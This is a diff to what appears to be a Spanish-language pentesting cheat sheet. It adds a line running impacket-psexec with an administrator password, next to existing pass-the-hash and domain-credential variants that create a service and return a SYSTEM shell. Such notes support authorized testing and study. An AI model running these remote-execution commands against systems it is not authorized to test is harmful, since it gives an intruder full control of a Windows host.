@@ -504,6 +504,7 @@ NOTA:
 ❯ impacket-psexec domain/user@<IP> -hashes :NThash
 # Especificar puerto cuando el default falla
 
+❯ impacket-psexec Administrator:Password@<IP> cmd.exe
 ❯ impacket-psexec domain.corp/Administrator:Password@<IP> cmd.exe
 # Requiere credenciales válidas + admin local
 # Crea servicio → devuelve shell como NT AUTHORITY\SYSTEM
